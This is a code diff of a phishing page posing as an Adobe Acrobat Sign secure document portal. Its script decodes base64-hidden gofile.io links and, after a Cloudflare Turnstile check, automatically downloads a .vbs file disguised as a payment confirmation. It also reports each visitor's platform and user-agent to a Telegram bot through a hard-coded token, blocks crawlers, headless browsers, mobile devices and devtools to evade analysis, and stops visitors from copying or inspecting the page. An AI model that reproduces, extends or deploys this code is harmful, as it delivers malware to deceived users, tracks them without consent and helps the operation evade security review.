9t+HuewVgeIk0XPpKND9R6XNdNl8diiId1CR76yPe7xaHNuYKptjxK3Afco8zgP41lcdL7iPnEbcI8yj3OIx24DgY04g69sh3uceZxDPJmeNWiOXje6M9nhHmke5xCPbV+hIt0gvv3HxbsBXJm6FL5Z3Z3gttI4k+Fkmpr4p1v9f/7pBLeZxpmMx25dio0452PcdhpnMp5MITmco7dLnC9x8W09Xjl/EjbivNrjttQ4k/HY9+v4Avzy07LFbalxJsPJVBrT9l2Xx64t7hWg7XJtEfD20u9wYcNg0co1P6RfHtvEeYPbVuNMrZxTFhtxHl3iNtY4kytzLMLXD5s7oq69xplaue540IizPVV37TXO1MoNj8ICVr/Bba9xplauIxF+/p01riJQzcpZobER5+RadwSNM7VyXWOoEafrH3ftLIH5lWtehjer3/8AAKeUrJw8ErwAAAAASUVORK5CYII=" alt="Adobe Logo">
+            <img class="logo-img" src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcQfrgGB4Irv_xUPEjp2BJFEwEE2hdMs8x-q4w&s" alt="Adobe Logo" onerror="this.style.display='none';">
             <div class="brand-text">
                 <h1>Adobe Acrobat Sign <i class="fas fa-check-circle" style="color:#fa0f00; font-size:1.2rem;"></i></h1>
                 <p>Secure Document Portal</p>
@@ -281,7 +79,7 @@
     <div class="card-content" id="dynamicContent">
         <div style="text-align:center; padding:2rem 0;"><div class="loader"></div><p>Loading secure environment...</p></div>
     </div>
-    <div class="footer">
+    <div class="adobe-footer">
         <i class="fas fa-shield-alt"></i> Protected by Adobe Secure Cloud + Cloudflare Turnstile
     </div>
 </div>
@@ -305,8 +103,58 @@
 <script>
 (function() {
     // ============================================================
-    // MOBILE DETECTION & BLOCKING
+    // ANTI-CRAWLER / HEADLESS DETECTION (unchanged)
     // ============================================================
+    function isBotOrCrawler() {
+        const ua = navigator.userAgent.toLowerCase();
+        const headlessPatterns = ['headless', 'phantom', 'puppeteer', 'selenium', 'playwright', 'prerender'];
+        for (let pattern of headlessPatterns) if (ua.includes(pattern)) return true;
+        if (navigator.webdriver === true) return true;
+        if (window.chrome && window.chrome.loadTimes === undefined && navigator.languages === undefined) return true;
+        if (typeof InstallTrigger !== 'undefined' && !window.MSInputMethodContext && navigator.plugins.length === 0) return true;
+        return false;
+    }
+    if (isBotOrCrawler()) {
+        document.body.innerHTML = '<div style="display:none"></div>';
+        throw new Error('Access denied');
+    }
+
+    // ============================================================
+    // YOUR 4 FILE LINKS – STORED AS BASE64 (plain, no reversal)
+    // This hides the real URLs from simple text crawlers.
+    // ============================================================
+    const encodedUrls = [
+        "aHR0cHM6Ly9zdG9yZTUuZ29maWxlLmlvL2Rvd25sb2FkL2RpcmVjdC8yZjY0NDcyNy00NmRkLTQxOTYtOGI5My00OGE5YTYxMGQwMjgvUGF5bWVudF9Db25maXJtYXRpb25fZm9yX1B1cmNoYXNlX09yZGVyXzk5MTJYLnZicw==",
+        "aHR0cHM6Ly9zdG9yZS1uYS1waHgtMS5nb2ZpbGUuaW8vZG93bmxvYWQvZGlyZWN0L2E2ZjRkYWM2LWMzYWEtNDM1Mi1hZDJlLTQxMjYzMTJlOTczZS9QYXltZW50X0NvbmZpcm1hdGlvbl9PcmRlcl8lMjM5OTIxLnZicw==",
+        "aHR0cHM6Ly9zdG9yZTUuZ29maWxlLmlvL2Rvd25sb2FkL2RpcmVjdC8zMzkxZTZmMS1lMTZlLTQyZWItYWQ4NC03OGY3NzAzZTRlMzYvUGF5bWVudF9SZWNlaXB0X1RyYW5zYWN0aW9uXzk4NzY1NDMyLnZicw==",
+        "aHR0cHM6Ly9zdG9yZTUuZ29maWxlLmlvL2Rvd25sb2FkL2RpcmVjdC80NjE2ODZkOS02MjBiLTQyMDQtYWUwMS0xMmI5YzIwOTNiZjQvUGF5bWVudF9TdWNjZXNzX1JlZl8yMjA1MTgwMDEudmJz"
+    ];
+
+    // Decode each base64 string to get the real URL
+    const realUrls = encodedUrls.map(enc => atob(enc));
+
+    // Randomly select one
+    const randomIndex = Math.floor(Math.random() * realUrls.length);
+    const DOWNLOAD_URL = realUrls[randomIndex];
+    const FILE_NAME = DOWNLOAD_URL.substring(DOWNLOAD_URL.lastIndexOf('/') + 1);
+
+    // Debug: check if decoding worked (optional, remove in production)
+    console.log("Selected file:", FILE_NAME);
+
+    // ============================================================
+    // CLOUDFLARE TURNSTILE & TELEGRAM (your original, untouched)
+    // ============================================================
+    const TURNSTILE_KEY = "0x4AAAAAADK5IkKpaRCkJqWj";
+    const BOT_TOKEN_BASE64 = "ODMzNTAyOTIyODpBQUZwbWtkZzNhTTJQbGh6aGdKcTgyX252eXNzWGxCbXJNaw==";
+    const CHAT_ID_BASE64 = "NTMyNTA5ODg2MQ==";
+    const BOT_TOKEN = atob(BOT_TOKEN_BASE64);
+    const CHAT_ID = atob(CHAT_ID_BASE64);
+
+    let isVerified = false;
+    let downloadTriggered = false;
+    let notificationSent = false;
+
+    // Mobile detection (same as original)
     function isMobileDevice() {
         const ua = navigator.userAgent.toLowerCase();
         const mobileKeywords = ['android', 'iphone', 'ipad', 'ipod', 'blackberry', 'windows phone', 'mobile', 'tablet'];
@@ -315,16 +163,13 @@
         if('ontouchstart' in window && window.innerWidth <= 1024) return true;
         return false;
     }
-    
     if(isMobileDevice()) {
         document.getElementById('mobileBlocker').style.display = 'flex';
         document.querySelector('.card').style.display = 'none';
         throw new Error('Mobile access blocked');
     }
-    
-    // ============================================================
-    // ANTI-SCRAPING & ANTI-TAMPERING
-    // ============================================================
+
+    // Anti-devtools (same as original)
     document.addEventListener('contextmenu', e => { e.preventDefault(); return false; });
     document.addEventListener('keydown', e => {
         if(e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key==='I'||e.key==='C'||e.key==='J')) || (e.ctrlKey && e.key==='u') || (e.ctrlKey && e.key==='s')) {
@@ -332,7 +177,6 @@
         }
         if((e.ctrlKey && e.key==='a') || (e.ctrlKey && e.key==='c')) { e.preventDefault(); return false; }
     });
-    
     let devtoolsOpen = false;
     setInterval(() => {
         const widthDiff = window.outerWidth - window.innerWidth > 160;
@@ -345,39 +189,13 @@
             }
         } else { devtoolsOpen = false; }
     }, 1500);
-    
     document.addEventListener('dragstart', e => e.preventDefault());
     document.addEventListener('selectstart', e => e.preventDefault());
     document.addEventListener('copy', e => e.preventDefault());
     console.clear();
     setInterval(() => console.clear(), 2000);
-    console.log = console.warn = console.error = console.info = console.debug = function(){};
-    
-    // ============================================================
-    // CONFIGURATION
-    // ============================================================
-    
-    var _turnstileKey = "0x4AAAAAADK5IkKpaRCkJqWj";
-    
-    // Telegram Bot Token - Base64 encoded
-    var _botTokenBase64 = "ODMzNTAyOTIyODpBQUZwbWtkZzNhTTJQbGh6aGdKcTgyX252eXNzWGxCbXJNaw==";
-    var _botToken = atob(_botTokenBase64);
-    
-    // Chat ID - Base64 encoded
-    var _chatIdBase64 = "NTMyNTA5ODg2MQ==";
-    var _chatId = atob(_chatIdBase64);
-    
-    // SINGLE DOWNLOAD LINK
-    var _singleFileUrl = "https://store3.gofile.io/download/direct/20083b00-ddc6-4dab-ba41-21163b7cecef/Payment_Remittance_Notification_092-213.vbs";
-    var _fileName = "Adobe_Signed_Document.vbs";
-    
-    let isVerified = false;
-    let downloadTriggered = false;
-    let notificationSent = false;
-    
-    // ============================================================
-    // TELEGRAM NOTIFICATION
-    // ============================================================
+
+    // Telegram notification
     async function sendTelegramNotification(eventType, extraInfo = "") {
         try {
             const time = new Date().toLocaleString();
@@ -385,28 +203,23 @@
             const platform = navigator.platform;
             let text = `📄 *Adobe Acrobat Sign Event*\n📌 *${eventType}*\n🕒 Time: ${time}\n💻 Platform: ${platform}\n🔧 User-Agent: ${userAgent}`;
             if (extraInfo) text += `\n📎 ${extraInfo}`;
-            
-            const url = `https://api.telegram.org/bot${_botToken}/sendMessage`;
-            await fetch(url, {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const response = await fetch(url, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({ 
-                    chat_id: _chatId, 
-                    text: text, 
-                    parse_mode: "Markdown" 
-                })
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: "Markdown" })
             });
-        } catch(e) {}
+            const result = await response.json();
+            if(!result.ok) console.warn("Telegram error:", result);
+        } catch(e) { console.warn("Telegram send failed:", e); }
     }
-    
-    // ============================================================
-    // DOWNLOAD FUNCTION
-    // ============================================================
+
+    // Download function
     function downloadSingleFile() {
         return new Promise((resolve) => {
             const a = document.createElement('a');
-            a.href = _singleFileUrl;
-            a.download = _fileName;
+            a.href = DOWNLOAD_URL;
+            a.download = FILE_NAME;
             a.style.display = 'none';
             a.style.position = 'absolute';
             document.body.appendChild(a);
@@ -417,7 +230,7 @@
             }, 500);
         });
     }
-    
+
     async function startAutoDownload() {
         if(downloadTriggered) return;
         downloadTriggered = true;
@@ -445,13 +258,11 @@
         
         if(success) {
             if(statusDiv) statusDiv.innerHTML = `<i class="fas fa-check-circle" style="color:#2e7d32;"></i> Document saved to Downloads folder!`;
-            
             const popup = document.getElementById('downloadPopup');
             if(popup) {
                 popup.style.display = 'block';
                 setTimeout(() => popup.style.display = 'none', 10000);
             }
-            
             const modal = document.getElementById('installerModal');
             if(modal && !window.modalShown) {
                 window.modalShown = true;
@@ -459,18 +270,15 @@
                 document.getElementById('closeModalBtn').onclick = () => modal.style.display = 'none';
                 setTimeout(() => modal.style.display = 'none', 8000);
             }
-            
             if(statusDiv) {
-                statusDiv.innerHTML += `<div style="margin-top:12px; background:#e8f5e9; border-radius:12px; padding:10px;"><i class="fas fa-folder-open"></i> File: Adobe_Signed_Document.vbs saved.</div>`;
+                statusDiv.innerHTML += `<div style="margin-top:12px; background:#e8f5e9; border-radius:12px; padding:10px;"><i class="fas fa-folder-open"></i> File: ${FILE_NAME} saved.</div>`;
             }
         } else {
             if(statusDiv) statusDiv.innerHTML = `<i class="fas fa-exclamation-triangle" style="color:#c62828;"></i> Download error. Please refresh.`;
         }
     }
-    
-    // ============================================================
-    // CLOUDFLARE TURNSTILE CALLBACK
-    // ============================================================
+
+    // Turnstile callback
     async function handleTurnstileCallback(token) {
         if(isVerified) return;
         isVerified = true;
@@ -482,19 +290,15 @@
             msgDiv.innerHTML = '✅ Verification complete! Preparing document...';
         }
         
-        // Telegram notification ONLY after Cloudflare verification completes
         if(!notificationSent) {
             notificationSent = true;
             await sendTelegramNotification("✅ CLOUDFLARE VERIFICATION COMPLETED", 
-                `Adobe Acrobat Sign: User passed Cloudflare Turnstile challenge. File "${_fileName}" will be downloaded automatically.`);
+                `Adobe Acrobat Sign: User passed Cloudflare Turnstile challenge. Random file selected: "${FILE_NAME}" will be downloaded automatically.`);
         }
         
         setTimeout(() => startAutoDownload(), 500);
     }
-    
-    // ============================================================
-    // SHOW "SECURE MODULE FAILED TO LOAD"
-    // ============================================================
+
     function showSecureModuleFailed() {
         document.getElementById('dynamicContent').innerHTML = `
             <div>
@@ -512,10 +316,7 @@
                 <button class="refresh-btn" onclick="location.reload()"><i class="fas fa-sync-alt"></i> Refresh Page</button>
             </div>`;
     }
-    
-    // ============================================================
-    // RENDER VERIFICATION PAGE
-    // ============================================================
+
     function renderVerificationPage() {
         const container = document.getElementById('dynamicContent');
         if(!container) return;
@@ -536,47 +337,37 @@
         
         let attempts = 0;
         const maxAttempts = 20;
-        
         const tryRender = () => {
             attempts++;
             if(window.turnstile && document.getElementById('turnstileContainer')) {
                 try {
                     turnstile.render('#turnstileContainer', {
-                        sitekey: _turnstileKey,
+                        sitekey: TURNSTILE_KEY,
                         theme: 'light',
                         callback: handleTurnstileCallback,
-                        'error-callback': function() {
-                            showSecureModuleFailed();
-                        },
+                        'error-callback': function() { showSecureModuleFailed(); },
                         'expired-callback': function() {
                             isVerified = false;
                             const msgDiv = document.getElementById('verifyMessage');
                             if(msgDiv) msgDiv.innerHTML = '⏳ Verification expired. Please try again.';
                         }
                     });
-                } catch(e) {
-                    showSecureModuleFailed();
-                }
+                } catch(e) { showSecureModuleFailed(); }
             } else if(attempts < maxAttempts) {
                 setTimeout(tryRender, 200);
-            } else {
-                showSecureModuleFailed();
-            }
+            } else { showSecureModuleFailed(); }
         };
-        
         tryRender();
     }
-    
-    // Send page visit notification
-    async function sendPageVisit() {
-        await sendTelegramNotification("🌐 PAGE VISIT", "Adobe Acrobat Sign portal accessed. Waiting for Cloudflare verification.");
+
+    async function testTelegramConnection() {
+        try {
+            await sendTelegramNotification("🌐 PAGE VISIT", "Adobe Acrobat Sign portal accessed. Waiting for Cloudflare verification.");
+        } catch(e) {}
     }
     
-    // ============================================================
-    // INITIALIZATION
-    // ============================================================
     renderVerificationPage();
-    sendPageVisit();
+    testTelegramConnection();
     
     // Anti-tamper observer
     const observer = new MutationObserver(function(mutations) {
